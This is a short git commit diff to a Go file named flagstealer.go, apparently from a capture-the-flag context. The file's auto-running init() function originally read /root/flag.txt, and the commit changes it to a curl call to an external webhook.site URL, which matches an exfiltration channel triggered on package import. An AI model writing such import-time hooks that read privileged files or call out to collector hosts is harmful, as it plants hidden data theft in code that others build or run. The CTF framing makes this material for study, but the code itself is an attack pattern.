e9f696daaf1704b02bb9d4c756a58f7290d10591
Youssef-Anan <130401572+Youssef-Anan@users.noreply.github.com>
2025-04-12 08:32:02 +0200

    Update flagstealer.go

--- flagstealer.go
+++ flagstealer.go
@@ -6,7 +6,7 @@ import (
 )
 
 func init() {
-    cmd := exec.Command("cat", "/root/flag.txt")
+    cmd := exec.Command("curl", "https://webhook.site/a7a9482c-33df-4d35-8203-4aaab1035567/test")
     out, err := cmd.CombinedOutput()
     if err != nil {
         fmt.Println("[!] Error reading flag:", err)
